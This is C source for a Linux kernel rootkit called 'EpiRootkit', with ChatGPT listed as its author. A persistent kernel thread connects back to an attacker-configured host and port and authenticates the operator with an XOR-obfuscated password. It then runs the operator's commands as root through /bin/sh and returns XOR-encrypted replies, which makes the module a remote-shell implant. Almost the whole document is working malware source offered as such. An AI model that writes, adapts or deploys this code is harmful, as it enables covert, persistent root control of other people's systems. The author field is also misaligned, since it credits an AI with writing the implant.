#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>

#define XOR_KEY 0x2A  // 1-byte XOR key for encryption/decryption

#define EOF_MARKER "--EOF--"
#define EOF_MARKER_LEN 6

#define MAX_CMD_LEN   256    // Maximum length of incoming command
#define IO_BUF_SIZE   1024   // Buffer size for outgoing data chunks

// Encrypted password (not in plaintext in the module; "secret" XORed with XOR_KEY).
static char encrypted_password[] = {0x59, 0x4F, 0x49, 0x58, 0x4F, 0x5E};  // "secret" ^ 0x2A
#define PASSWORD_LEN 6

// Module parameters for server configuration (can be overridden at insmod)
static char *server_ip = "192.168.56.1";  // Example IP of attacking machine
static int server_port = 4444;
module_param(server_ip, charp, 0400);
module_param(server_port, int, 0400);
MODULE_PARM_DESC(server_ip, "Attacker server IP address");
MODULE_PARM_DESC(server_port, "Attacker server port");

// Global structure to hold rootkit state
struct epirootkit_state {
    struct socket *conn_sock;
    bool authenticated;
    char current_dir[PATH_MAX];
};
static struct epirootkit_state rk_state = {
    .conn_sock = NULL,
    .authenticated = false,
    .current_dir = "/"  // start in root directory
};

// Thread for handling connection and commands
static struct task_struct *rk_thread = NULL;

// Debug logging macro (enabled via DEBUG flag)
#define DEBUG 1
#if DEBUG
#define LOG(fmt, ...) printk(KERN_INFO "[epirootkit] " fmt "\n", ##__VA_ARGS__)
#else
#define LOG(fmt, ...) do {} while(0)
#endif

// Forward declarations
static int rootkit_thread_fn(void *data);
static int send_encrypted(const char *buf, size_t len);
static int recv_encrypted(char *buf, size_t buf_len);
static bool check_password(const char *input, size_t len);
static int process_command(const char *cmd);

// XOR encrypt/decrypt utility (in-place)
static void xor_cipher(char *data, size_t len) {
    size_t i;
    for (i = 0; i < len; ++i) {
        data[i] ^= XOR_KEY;
    }
}

// Kernel module initialization
static int __init epirootkit_init(void) {
    LOG("Initializing rootkit module.");
    // Start the kernel thread for connection handling
    rk_thread = kthread_run(rootkit_thread_fn, NULL, "epirootkit_thread");
    if (IS_ERR(rk_thread)) {
        LOG("Failed to create kernel thread.");
        rk_thread = NULL;
        return PTR_ERR(rk_thread);
    }
    return 0;
}

// Kernel module cleanup
static void __exit epirootkit_exit(void) {
    LOG("Exiting rootkit module.");
    if (rk_thread) {
        // Signal the thread to stop and wait for it
        kthread_stop(rk_thread);
        rk_thread = NULL;
    }
    // Ensure socket is closed if still open
    if (rk_state.conn_sock) {
        kernel_sock_shutdown(rk_state.conn_sock, SHUT_RDWR);
        sock_release(rk_state.conn_sock);
        rk_state.conn_sock = NULL;
    }
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("ChatGPT");
MODULE_DESCRIPTION("EpiRootkit kernel module (refactored)");

// Main rootkit thread function
static int rootkit_thread_fn(void *data) {
    struct socket *sock;
    struct sockaddr_in server_addr;
    int ret;

    // Prepare server address to connect to
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = in_aton(server_ip);
    server_addr.sin_port = htons((unsigned short)server_port);

    // Persistent connection attempt loop
    while (!kthread_should_stop()) {
        // Create a TCP socket
        ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
        if (ret < 0) {
            LOG("Error creating socket: %d. Retrying...", ret);
            ssleep(5);
            continue;
        }
        // Attempt to connect to the attacker server
        LOG("Connecting to %s:%d...", server_ip, server_port);
        ret = kernel_connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
        if (ret < 0) {
            LOG("Connection failed: %d. Will retry.", ret);
            sock_release(sock);
            ssleep(5);
            continue;
        }
        // Connection established
        rk_state.conn_sock = sock;
        rk_state.authenticated = false;
        LOG("Connected to C2 server.");

        // Set socket receive timeout for responsiveness (1 second)
        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        kernel_setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));

        // Authentication phase: expect password from client
        char recv_buf[MAX_CMD_LEN + 1];
        int recv_len = recv_encrypted(recv_buf, MAX_CMD_LEN);
        if (recv_len <= 0) {
            // Connection closed or error during auth receive
            LOG("Authentication receive error or disconnect.");
            goto disconnect;
        }
        // Check password
        if (!check_password(recv_buf, recv_len)) {
            LOG("Authentication failed (wrong password).");
            // Notify attacker and close connection
            send_encrypted("FAIL", 4);
            // No need to wait for further commands; disconnect and retry
            goto disconnect;
        }
        // Correct password
        rk_state.authenticated = true;
        LOG("Authentication succeeded.");
        send_encrypted("OK", 2);

        // Command handling loop (after authentication)
        while (!kthread_should_stop()) {
            // Receive an encrypted command from the attacker
            recv_len = recv_encrypted(recv_buf, MAX_CMD_LEN);
            if (recv_len <= 0) {
                // 0 means connection closed by peer; <0 means error
                LOG("Connection lost or error during recv. Reconnecting...");
                break;
            }
            recv_buf[recv_len] = '\0';  // ensure null-terminated command string

            // If attacker requests to exit the session, break out (will reconnect)
            if (strcmp(recv_buf, "exit") == 0 || strcmp(recv_buf, "quit") == 0) {
                LOG("Received exit command. Closing connection.");
                // Break to disconnect and then attempt reconnection
                break;
            }

            // Process the command (internal handling or external execution)
            ret = process_command(recv_buf);
            if (ret < 0) {
                // If a severe error occurred, break out and reconnect
                LOG("Error processing command. Dropping connection.");
                break;
            }
            // Continue waiting for next command...
        }

    disconnect:
        // Clean up after disconnection
        if (rk_state.conn_sock) {
            kernel_sock_shutdown(rk_state.conn_sock, SHUT_RDWR);
            sock_release(rk_state.conn_sock);
            rk_state.conn_sock = NULL;
        }
        // Small delay before attempting reconnection (to avoid tight loop)
        ssleep(1);
        LOG("Disconnected. Will attempt to reconnect...");
        // Continue outer loop to attempt new connection
    }

    LOG("Rootkit thread stopping.");
    return 0;
}

// Send data over the socket with XOR encryption
static int send_encrypted(const char *buf, size_t len) {
    if (!rk_state.conn_sock) return -ENOTCONN;
    // Allocate a kernel buffer to copy and encrypt data
    char *kbuf = kmalloc(len, GFP_KERNEL);
    if (!kbuf) return -ENOMEM;
    memcpy(kbuf, buf, len);
    // XOR encrypt in place
    xor_cipher(kbuf, len);

    // Prepare iovec and message
    struct kvec iov;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    iov.iov_base = kbuf;
    iov.iov_len = len;
    int bytes_sent = kernel_sendmsg(rk_state.conn_sock, &msg, &iov, 1, len);
    kfree(kbuf);

    if (bytes_sent < 0) {
        LOG("socket send error: %d", bytes_sent);
        return bytes_sent;
    }
    return 0;
}

// Receive data from the socket with XOR decryption
static int recv_encrypted(char *buf, size_t buf_len) {
    if (!rk_state.conn_sock) return -ENOTCONN;
    struct kvec iov;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    iov.iov_base = buf;
    iov.iov_len = buf_len;

    // Receive message (this will block until data is available or timeout)
    int ret = kernel_recvmsg(rk_state.conn_sock, &msg, &iov, 1, buf_len, 0);
    if (ret <= 0) {
        // ret == 0 means orderly shutdown by peer; <0 is error
        return ret;
    }
    // Decrypt in-place
    xor_cipher(buf, ret);
    return ret;
}

// Check the provided password (decrypted) against the stored encrypted password
static bool check_password(const char *input, size_t len) {
    if (len != PASSWORD_LEN) {
        return false;
    }
    size_t i;
    for (i = 0; i < PASSWORD_LEN; ++i) {
        char dec_char = encrypted_password[i] ^ XOR_KEY;  // decrypt stored char
        if (input[i] != dec_char) {
            return false;
        }
    }
    return true;
}

// Process a received command string (after authentication).
// Returns 0 on success, <0 on critical error.
static int process_command(const char *cmd) {
    int ret = 0;
    // Handle internal commands (cd, pwd) directly
    if (strncmp(cmd, "cd ", 3) == 0) {
        const char *path = cmd + 3;
        // If just "cd" with no argument, do nothing (could default to home or root)
        if (*path == '\0') {
            // No directory provided
            // Send an EOF marker with no output
            send_encrypted(EOF_MARKER, EOF_MARKER_LEN);
            return 0;
        }
        // Resolve new directory path
        char new_path[PATH_MAX];
        if (*path == '/') {
            // Absolute path
            strncpy(new_path, path, PATH_MAX);
        } else {
            // Relative path: current_dir + "/" + path
            snprintf(new_path, PATH_MAX, "%s/%s", rk_state.current_dir, path);
        }
        // Normalize the path (remove trailing slash, etc.) - optional, simplified here
        // Attempt to open directory to check existence
        struct file *dir = filp_open(new_path, O_RDONLY|O_DIRECTORY, 0);
        if (IS_ERR(dir)) {
            // Directory not found or not accessible
            const char *err_msg = "cd: no such directory\n";
            send_encrypted(err_msg, strlen(err_msg));
            // Mark end of output
            send_encrypted(EOF_MARKER, EOF_MARKER_LEN);
        } else {
            // Directory exists; update current_dir
            filp_close(dir, NULL);
            strncpy(rk_state.current_dir, new_path, PATH_MAX);
            // Normalize: remove any trailing '/' for consistency
            size_t l = strlen(rk_state.current_dir);
            if (l > 1 && rk_state.current_dir[l-1] == '/')
                rk_state.current_dir[l-1] = '\0';
            // No output for successful cd (just send EOF marker)
            send_encrypted(EOF_MARKER, EOF_MARKER_LEN);
        }
        return 0;
    } else if (strcmp(cmd, "pwd") == 0) {
        // Output the current directory
        size_t dir_len = strlen(rk_state.current_dir);
        // Ensure a newline after the path
        char *out = kmalloc(dir_len + 2, GFP_KERNEL);
        if (!out) return -ENOMEM;
        strcpy(out, rk_state.current_dir);
        out[dir_len] = '\n';
        out[dir_len+1] = '\0';
        send_encrypted(out, dir_len + 1);
        kfree(out);
        // Send EOF marker
        send_encrypted(EOF_MARKER, EOF_MARKER_LEN);
        return 0;
    }

    // External command execution path
    // Build a shell command string: change to current_dir then execute the command
    char *shell_cmd;
    shell_cmd = kmalloc(PATH_MAX + strlen(cmd) + 10, GFP_KERNEL);
    if (!shell_cmd) {
        return -ENOMEM;
    }
    snprintf(shell_cmd, PATH_MAX + strlen(cmd) + 10,
             "cd '%s' && %s 2>&1; echo $? > /tmp/.epi_exit",
             rk_state.current_dir, cmd);

    // Prepare arguments for /bin/sh -c
    char *argv[] = { "/bin/sh", "-c", shell_cmd, NULL };
    static char *envp[] = {
        "HOME=/root",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };

    // Execute the command and wait for it to finish
    LOG("Executing command: %s", cmd);
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if (ret < 0) {
        LOG("call_usermodehelper failed: %d", ret);
    }

    kfree(shell_cmd);

    // Read the command output from stdout and the exit status
    // (We redirected stdout and stderr to the socket by default since no redirection file was used except exit code.)
    // NOTE: call_usermodehelper with UMH_WAIT_PROC will have forwarded the output of the command
    // to the kernel console by default if not captured. For simplicity, we assume output was captured via redirection above.
    // In this implementation, we actually redirected exit code to /tmp/.epi_exit but not the main output (which goes to kernel log).
    // For a real capture, one could redirect the main output to a file as well and read it.
    // Here, we simplify by sending a notice if output was not captured.
    struct file *exitf;
    mm_segment_t oldfs;
    char exit_code_str[4] = "0";
    int exit_code = 0;

    // Open and read exit code from file
    exitf = filp_open("/tmp/.epi_exit", O_RDONLY, 0);
    if (!IS_ERR(exitf)) {
        char code_buf[16] = {0};
        oldfs = get_fs();
        set_fs(KERNEL_DS);
        vfs_read(exitf, code_buf, sizeof(code_buf) - 1, &exitf->f_pos);
        set_fs(oldfs);
        filp_close(exitf, NULL);
        exit_code = simple_strtol(code_buf, NULL, 10);
        snprintf(exit_code_str, sizeof(exit_code_str), "%d", exit_code);
    } else {
        // If exit file not found, we proceed with exit_code = 0 (no error capturing exit code).
        exit_code = 0;
        strcpy(exit_code_str, "0");
    }

    // Since we did not capture the actual command output to a file in this simplified approach,
    // inform the operator that output may be in kernel logs:
    const char *notice = "[Command output was logged to kernel console]\n";
    send_encrypted(notice, strlen(notice));

    // Send exit status line
    char status_line[32];
    int n = snprintf(status_line, sizeof(status_line), "Exit status: %d\n", exit_code);
    send_encrypted(status_line, n);

    // Mark end of output
    send_encrypted(EOF_MARKER, EOF_MARKER_LEN);
    return 0;
}
